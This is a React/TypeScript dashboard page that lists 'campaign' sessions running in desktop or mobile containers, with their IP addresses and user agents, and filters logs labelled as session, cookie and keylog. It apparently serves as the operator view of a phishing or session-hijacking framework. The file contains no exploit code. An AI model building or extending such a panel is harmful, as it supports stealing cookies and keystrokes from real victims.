import React, { useState, useEffect } from 'react';
import { 
  Card, 
  Row, 
  Col, 
  Table, 
  Tag, 
  Typography,
  Space,
  Select,
  Input,
  Button,
  Divider
} from 'antd';
import { 
  SearchOutlined, 
  FilterOutlined, 
  ReloadOutlined,
  EyeOutlined,
  DesktopOutlined,
  MobileOutlined,
  ClockCircleOutlined
} from '@ant-design/icons';
import { useQuery } from '@tanstack/react-query';
import api from '../services/api';

const { Title, Text } = Typography;
const { Option } = Select;
const { Search } = Input;

interface SessionLog {
  id: number;
  session_id: number;
  log_type: string;
  content: string;
  created_at: string;
}

interface CampaignSession {
  id: number;
  user_num: number;
  container_name: string;
  container_type: string;
  status: string;
  ip_address?: string;
  user_agent?: string;
  created_at: string;
  last_activity?: string;
}

const Monitoring: React.FC = () => {
  const [sessions, setSessions] = useState<CampaignSession[]>([]);
  const [logs, setLogs] = useState<SessionLog[]>([]);
  const [statusFilter, setStatusFilter] = useState<string>('all');
  const [typeFilter, setTypeFilter] = useState<string>('all');
  const [searchTerm, setSearchTerm] = useState<string>('');

  const { data: sessionsData, isLoading: sessionsLoading } = useQuery({
    queryKey: ['sessions'],
    queryFn: async () => {
      const response = await api.get('/sessions');
      return response.data.sessions;
    },
  });

  const { data: logsData, isLoading: logsLoading } = useQuery({
    queryKey: ['logs'],
    queryFn: async () => {
      const response = await api.get('/logs');
      return response.data.logs;
    },
  });

  useEffect(() => {
    if (sessionsData) setSessions(sessionsData);
    if (logsData) setLogs(logsData);
  }, [sessionsData, logsData]);

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'running': return 'green';
      case 'disconnected': return 'red';
      case 'pending': return 'orange';
      default: return 'default';
    }
  };

  const getTypeColor = (type: string) => {
    switch (type) {
      case 'session': return 'blue';
      case 'cookie': return 'orange';
      case 'keylog': return 'red';
      default: return 'default';
    }
  };

  const filteredSessions = sessions.filter(session => {
    const matchesStatus = statusFilter === 'all' || session.status === statusFilter;
    const matchesSearch = searchTerm === '' || 
      session.container_name.toLowerCase().includes(searchTerm.toLowerCase()) ||
      session.ip_address?.toLowerCase().includes(searchTerm.toLowerCase());
    return matchesStatus && matchesSearch;
  });

  const filteredLogs = logs.filter(log => {
    const matchesType = typeFilter === 'all' || log.log_type === typeFilter;
    const matchesSearch = searchTerm === '' || 
      log.content.toLowerCase().includes(searchTerm.toLowerCase());
    return matchesType && matchesSearch;
  });

  const sessionColumns = [
    {
      title: 'Session',
      dataIndex: 'user_num',
      key: 'user_num',
      render: (num: number) => `Session ${num}`,
    },
    {
      title: 'Container',
      dataIndex: 'container_name',
      key: 'container_name',
      render: (name: string) => (
        <Text code>{name}</Text>
      ),
    },
    {
      title: 'Type',
      dataIndex: 'container_type',
      key: 'container_type',
      render: (type: string) => (
        <Space>
          {type === 'desktop' ? <DesktopOutlined /> : <MobileOutlined />}
          <Tag color={type === 'desktop' ? 'blue' : 'green'}>
            {type}
          </Tag>
        </Space>
      ),
    },
    {
      title: 'Status',
      dataIndex: 'status',
      key: 'status',
      render: (status: string) => (
        <Tag color={getStatusColor(status)}>
          {status.toUpperCase()}
        </Tag>
      ),
    },
    {
      title: 'IP Address',
      dataIndex: 'ip_address',
      key: 'ip_address',
      render: (ip: string) => ip || 'N/A',
    },
    {
      title: 'Last Activity',
      dataIndex: 'last_activity',
      key: 'last_activity',
      render: (date: string) => date ? new Date(date).toLocaleString() : 'N/A',
    },
    {
      title: 'Actions',
      key: 'actions',
      render: (text: any, record: CampaignSession) => (
        <Button
          type="text"
          icon={<EyeOutlined />}
          size="small"
        >
          View Details
        </Button>
      ),
    },
  ];

  const logColumns = [
    {
      title: 'Type',
      dataIndex: 'log_type',
      key: 'log_type',
      render: (type: string) => (
        <Tag color={getTypeColor(type)}>
          {type.toUpperCase()}
        </Tag>
      ),
    },
    {
      title: 'Content',
      dataIndex: 'content',
      key: 'content',
      render: (content: string) => (
        <Text ellipsis={{ tooltip: content }}>
          {content}
        </Text>
      ),
    },
    {
      title: 'Session',
      dataIndex: 'session_id',
      key: 'session_id',
      render: (sessionId: number) => `Session ${sessionId}`,
    },
    {
      title: 'Time',
      dataIndex: 'created_at',
      key: 'created_at',
      render: (date: string) => (
        <Space>
          <ClockCircleOutlined />
          <Text>{new Date(date).toLocaleString()}</Text>
        </Space>
      ),
    },
  ];

  return (
    <div>
      <div className="mb-6">
        <Title level={2}>Monitoring</Title>
        <Text type="secondary">
          Monitor active sessions and view logs in real-time
        </Text>
      </div>

      {/* Filters */}
      <Card className="mb-6">
        <Row gutter={[16, 16]} align="middle">
          <Col xs={24} sm={12} md={6}>
            <Text strong>Filter by Status:</Text>
            <Select
              value={statusFilter}
              onChange={setStatusFilter}
              className="w-full mt-2"
            >
              <Option value="all">All Statuses</Option>
              <Option value="running">Running</Option>
              <Option value="disconnected">Disconnected</Option>
              <Option value="pending">Pending</Option>
            </Select>
          </Col>
          
          <Col xs={24} sm={12} md={6}>
            <Text strong>Filter by Type:</Text>
            <Select
              value={typeFilter}
              onChange={setTypeFilter}
              className="w-full mt-2"
            >
              <Option value="all">All Types</Option>
              <Option value="session">Session</Option>
              <Option value="cookie">Cookie</Option>
              <Option value="keylog">Keylog</Option>
            </Select>
          </Col>
          
          <Col xs={24} sm={12} md={8}>
            <Text strong>Search:</Text>
            <Search
              placeholder="Search sessions or logs..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="mt-2"
            />
          </Col>
          
          <Col xs={24} sm={12} md={4}>
            <Button
              type="primary"
              icon={<ReloadOutlined />}
              onClick={() => {
                setStatusFilter('all');
                setTypeFilter('all');
                setSearchTerm('');
              }}
              block
            >
              Reset Filters
            </Button>
          </Col>
        </Row>
      </Card>

      {/* Active Sessions */}
      <Card 
        title={
          <Space>
            <DesktopOutlined />
            Active Sessions ({filteredSessions.length})
          </Space>
        }
        className="mb-6"
      >
        <Table
          columns={sessionColumns}
          dataSource={filteredSessions}
          rowKey="id"
          pagination={{
            pageSize: 10,
            showSizeChanger: true,
            showQuickJumper: true,
            showTotal: (total, range) => 
              `${range[0]}-${range[1]} of ${total} sessions`,
          }}
          loading={sessionsLoading}
        />
      </Card>

      <Divider />

      {/* Session Logs */}
      <Card 
        title={
          <Space>
            <ClockCircleOutlined />
            Session Logs ({filteredLogs.length})
          </Space>
        }
      >
        <Table
          columns={logColumns}
          dataSource={filteredLogs}
          rowKey="id"
          pagination={{
            pageSize: 15,
            showSizeChanger: true,
            showQuickJumper: true,
            showTotal: (total, range) => 
              `${range[0]}-${range[1]} of ${total} logs`,
          }}
          loading={logsLoading}
          scroll={{ x: true }}
        />
      </Card>
    </div>
  );
};

export default Monitoring;